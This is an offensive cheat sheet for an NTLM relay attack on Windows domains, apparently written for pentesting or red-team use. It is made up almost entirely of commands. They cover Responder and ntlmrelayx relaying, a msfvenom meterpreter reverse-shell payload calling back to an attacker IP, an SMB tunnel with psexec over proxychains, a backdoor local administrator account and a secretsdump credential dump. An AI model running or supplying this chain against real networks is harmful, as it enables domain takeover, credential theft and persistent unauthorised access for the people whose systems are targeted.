# WEAPONIZED NTLM RELAY

## Tools: ntlmrelayx.py, responder

#### 1) Turn off SMB in Responder configuration as ntlmrelayx.py will be handling SMB

#### sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf

#### 2) Start responder

#### sudo python3 responder.py -I INTERFACE

#### 3) ntlmrelayx.py -t ldap://IP -smb2support --escalate-user USER

## TIP: Works only when SMB signing is DISABLED (Use nmap for SMB privileges on the network)

#### 4) Required packages: krb5-user, cifs-utils

#### 5) sc stop netlogon

#### 6) sc stop lanmanserver and sc config lanmanserver start= disabled

#### 7) sc stop lanmanworkstation and sc config lanmanworkstation start= disabled

#### 8) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=PORT -f exe > shell.exe

#### 9) ntlmrelayx.py -t smb://DC -smb2support -socks

#### 10) portfwd add -R -L 0.0.0.0 -l 445 -p 445 (Meterpreter session)

#### Wait 1-3 minutes for tunnel

#### 11) Add "socks4 127.0.0.1 1080" to proxychains configuration file /etc/proxychains.conf

#### 12) proxychains psexec.py -no-pass DOMAIN/USERNAME@IP_ADDRESS

#### 13) net user jimmy PASSWORD /add

#### 14) net localgroup Administrators /add jimmy

#### Alternate tool: SMBExec.py

#### 15) secretsdump.py 'DOMAIN/jimmy:PASSWORD:@IP_ADDRESS

#### 16) DOMAIN PWNED!
